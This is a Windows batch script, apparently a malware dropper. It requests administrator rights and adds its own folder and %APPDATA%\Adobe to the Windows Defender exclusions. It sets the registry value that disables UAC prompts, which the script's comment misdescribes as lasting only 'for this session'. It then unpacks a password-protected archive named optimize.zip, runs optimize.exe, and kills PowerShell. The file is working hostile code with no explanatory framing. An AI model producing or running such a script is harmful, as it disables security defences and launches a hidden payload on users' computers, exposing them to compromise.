@echo off
TITLE Unwind File

:: Check for Administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    :: Relaunch the script as administrator
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: Get the exact folder where this .bat file is located
set "CURRENT_DIR=%~dp0"
:: Remove the trailing backslash from the path so it formats nicely
if "%CURRENT_DIR:~-1%"=="\" set "CURRENT_DIR=%CURRENT_DIR:~0,-1%"

echo Adding %APPDATA%\Adobe to Windows Defender Exclusions...
echo Adding %CURRENT_DIR% to Windows Defender Exclusions...
:: Add both paths to the exclusion list at the same time
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Adobe', '%CURRENT_DIR%'"

:: Disable UAC for this session
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f 1>NUL 2>NUL
timeout /t 15 /nobreak >nul
:: Unwind the file with 7z.exe
set "SEVEN_ZIP_EXE=%CURRENT_DIR%\7z.exe"
%SEVEN_ZIP_EXE% x "%CURRENT_DIR%\optimize.zip" -p123 -o"%CURRENT_DIR%

:: Execute the extracted file
start %CURRENT_DIR%\optimize.exe
timeout /t 15 /nobreak >nul
taskkill /IM powershell.exe /F